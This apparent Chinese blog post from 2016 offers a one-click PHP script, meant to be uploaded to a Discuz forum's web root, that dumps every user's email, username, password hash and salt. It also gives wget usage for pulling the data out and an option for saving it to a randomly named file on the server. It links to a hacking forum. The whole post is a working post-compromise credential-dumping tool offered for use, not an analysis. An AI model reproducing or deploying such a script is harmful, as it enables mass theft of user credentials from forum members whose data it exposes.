---
title: dz 一键导库脚本
date: 2016-04-29 14:11
tags:
---


**特点：**
1. 不会出现乱码
2. 无需作任何配置
3. 数据量超过500w 自动将数据保存至该服务器


默认 `dump uc_members` 表，如不存在则`dump members` 表。

**用法：**

`wget http://localhost/dz7.2/data2.php?dump=1 -O localhost.txt`

数据量巨大(大于 500W)的情况下 防止web崩溃 或内存不足 使用下面的参数 将数据保存至当前服务器
`http://localhost/dz7.2/data2.php?save=1`

**该脚本上传至网站根目录，无需作任何配置**
```php
<?php
define("ENDSTR",End_str());
ignore_user_abort();
set_time_limit(0);
ini_set("max_execution_time","0");
ob_clean();
require_once './include/common.inc.php';
header('Content-type: text/html;charset=utf-8');
ini_set('memory_limit',-1);
error_reporting(0);
$dump=$_GET['dump']?$_GET['dump']:0;
$save=$_GET['save']?$_GET['save']:0;


$tablename_arr=array("uc_members","members");

$result= $db->result ( $db->query("SHOW TABLES like '%$tablename_arr[0]%' "),0);
$result1= $db->result ( $db->query("SHOW TABLES like '%$tablename_arr[1]%' "),0);

if(!empty($result) && !empty ($result1)) {

    $tablename = $result;
    $type=2;
}else{

    $tablename = $result1;
    $type=1;
}

$count=$db->result ( $db->query("select count(-1) from $tablename"),0);

if( empty($tablename)&& $count ==0){

    exit('表为空,或没有想要查询的表'.ENDSTR);
}


$endstr=ENDSTR;
$infos=<<<EOL
    基本信息
    ------------------------------------------------------------- {$endstr}
    当前表: {$tablename} {$endstr}
    数据量: {$count} {$endstr}
    网站编码: {$GLOBALS['charset']} {$endstr}
    当前页面所使用编码:utf-8  {$endstr}{$endstr}{$endstr}
    帮助信息{$endstr}
    -------------------------------------------------------------{$endstr}
    使用wget下载:{$endstr}
    wget http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]?dump=1 -O $_SERVER[HTTP_HOST].txt{$endstr}{$endstr}
    数据量巨大(大于 500W)的情况下 防止web崩溃 或内存不足 使用下面的参数 将数据保存至当前服务器{$endstr}
    http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]?save=1{$endstr}{$endstr}
EOL;

if(is_Browser() && $dump==0 &&$save==0 ) {
    exit($infos);
}


/*****************************
* wget 下载部分
/******************************/
if($dump!=0){
    if(is_Browser()){

        exit('请使用wget访问'.ENDSTR.'wget http://'."$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]?dump=1 -O $_SERVER[HTTP_HOST].txt".ENDSTR);
    }

    $limit_start=0; $limit_length=5000; $limit_end=$count;$limit_end=$limit_end-$limit_start;
    $limit_length=$limit_end>$limit_length?$limit_length:$limit_end;
    $section=ceil($limit_end/$limit_length);
    if (ob_get_level() == 0){
        ob_start();
    }
    echo "当前表: {$tablename} {$endstr}".
          "数据量: {$count} {$endstr}";
    echo "---------------------------------------------------------------------------------------{$endstr}";
if($type==2){

    for($i=0;$i<$section;$i++) {
        $sql = "select email,username,password,salt from  $tablename " . ' LIMIT  ' . ($limit_start + 1 + $i * $limit_length) . ',' . $limit_length . ';';
        $query=$db->query($sql);
        while($result=$db->fetch_array($query)){

            echo iconv($GLOBALS['charset'],'UTF-8',$result['email'])."\t".
                iconv($GLOBALS['charset'],'UTF-8',$result['username'])."\t".
                iconv($GLOBALS['charset'],'UTF-8',$result['password'])."\t".
                iconv($GLOBALS['charset'],"UTF-8",$result['salt']).ENDSTR;

        }

        ob_end_flush();
    }

}else{
    for($i=0;$i<$section;$i++) {
        $sql = "select email,username,password from  $tablename  " . ' LIMIT  ' . ($limit_start + 1 + $i * $limit_length) . ',' . $limit_length . ';';
        $query=$db->query($sql);
        while($result=$db->fetch_array($query)){

            echo iconv($GLOBALS['charset'],'UTF-8',$result['email'])."\t".
                iconv($GLOBALS['charset'],'UTF-8',$result['username'])."\t".
                iconv($GLOBALS['charset'],'UTF-8',$result['password']).ENDSTR;

        }

        ob_end_flush();
    }
}
exit();
}


if($save!=0){
    ob_end_flush();
    $filename='data_'.substr(md5(mt_rand()),28,12).'.txt';
    $limit_start=0; $limit_length=10000; $limit_end=$count;$limit_end=$limit_end-$limit_start;
    $limit_length=$limit_end>$limit_length?$limit_length:$limit_end;
    $section=ceil($limit_end/$limit_length);
    $head= "当前表: {$tablename} ".PHP_EOL.
        "数据量: {$count} ".PHP_EOL.
        "---------------------------------------------------------------------------------------".PHP_EOL;
    file_put_contents($filename,$head);
    if($type==2){
        for($i=0;$i<$section;$i++) {
            $sql = "select email,username,password,salt from  $tablename " . ' LIMIT  ' . ($limit_start + 1 + $i * $limit_length) . ',' . $limit_length . ';';
            $query=$db->query($sql);
             echo '正在执行: '.$sql.ENDSTR;
              flush();
            while($result=$db->fetch_array($query)){
                file_put_contents($filename,iconv($GLOBALS['charset'],'UTF-8',$result['email'])."\t".
                    iconv($GLOBALS['charset'],'UTF-8',$result['username'])."\t".
                    iconv($GLOBALS['charset'],'UTF-8',$result['password'])."\t".
                    iconv($GLOBALS['charset'],"UTF-8",$result['salt']).PHP_EOL,FILE_APPEND);
            }
        }
        echo(ENDSTR.'备份完毕，下载地址为: '. DownloadName().$filename.' 请立即下载！');
    }else{

        for($i=0;$i<$section;$i++) {
            $sql = "select email,username,password from  $tablename " . ' LIMIT  ' . ($limit_start + 1 + $i * $limit_length) . ',' . $limit_length . ';';
            $query=$db->query($sql);
             echo '正在执行: '.$sql.ENDSTR;
              flush();
            while($result=$db->fetch_array($query)){
                file_put_contents($filename,iconv($GLOBALS['charset'],'UTF-8',$result['email'])."\t".
                    iconv($GLOBALS['charset'],'UTF-8',$result['username'])."\t".
                    iconv($GLOBALS['charset'],'UTF-8',$result['password']).PHP_EOL,FILE_APPEND);

            }

        }
      echo(ENDSTR.'备份完毕，下载地址为: '. DownloadName().$filename.' 请立即下载！');
    }

}

function End_str(){
    if(stristr($_SERVER[HTTP_USER_AGENT],'wget') || stristr($_SERVER[HTTP_USER_AGENT],'curl') || empty($_SERVER[HTTP_USER_AGENT]) || php_sapi_name() ==='cli'){
        return PHP_EOL;
    }else{
        return "";
    }
}

function is_Browser(){
if(!stristr($_SERVER[HTTP_USER_AGENT],'wget')){
    return true;
 }
}

function DownloadName(){
    $url="http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $p=array_slice(explode('/',$url),-1);
    $t=$p[0];
    return rtrim($url,$t);
}
?>
```

[参考文章](https://www.t00ls.net/viewthread.php?tid=26809&highlight=wget)
[windows wget下载](https://www.t00ls.net/thread-28139-1-1.html)